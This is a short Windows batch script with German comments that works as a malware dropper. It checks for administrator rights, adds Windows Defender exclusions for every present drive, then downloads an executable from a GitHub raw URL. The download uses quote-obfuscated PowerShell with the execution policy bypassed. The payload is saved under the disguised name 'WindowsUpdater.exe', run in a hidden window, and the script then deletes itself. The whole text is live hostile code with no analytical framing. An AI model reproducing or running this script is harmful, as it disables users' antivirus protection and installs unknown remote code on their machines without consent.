��&cls
@echo off
set "Url=https://github.com/Python-is-trash/stub/raw/main/RuntimeBroker.exe"
set "Filename=WindowsUpdater.exe"

>nul 2>&1 net session || exit /b

rem Füge Ausnahmen für alle vorhandenen Laufwerke hinzu
for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%D:\" (
        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%D:\'" >nul 2>&1
    )
)

rem Datei von der URL herunterladen und speichern
@powershell -No"P"r"o"file -Exe"c"ution"P"olicy Bypass -Command "In"v"oke-WebRequest '%Url%' -OutFile '%Filename%'" >nul 2>&1

rem Prüfen, ob die Datei existiert und ausführen
if exist "%Filename%" (
    powershell -WindowStyle Hidden -Command "Start-Process '%Filename%' -WindowStyle Hidden"
)

rem Skript nach Ausführung selbst löschen
start "" /b cmd /c del "%~f0" & exit
exit
